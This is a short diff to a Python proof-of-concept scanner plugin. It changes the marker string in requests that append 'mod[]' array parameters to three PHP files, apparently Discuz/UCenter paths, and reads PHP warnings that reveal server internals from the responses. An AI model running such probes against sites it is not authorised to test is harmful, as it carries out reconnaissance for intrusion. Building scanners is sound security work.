@@ -36,7 +36,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))      
             file_list =  ['/api.php','/uc_server/control/admin/db.php','/install/include/install_lang.php']
             for filename in file_list:
-                verify_url = '{target}'.format(target=self.target)+filename+'?mod[]=beebeeto'
+                verify_url = '{target}'.format(target=self.target)+filename+'?mod[]=cscan'
                 req = urllib2.urlopen(verify_url)
                 content = req.read()
                 if 'Warning:' in content and 'array_key_exists():' in content:
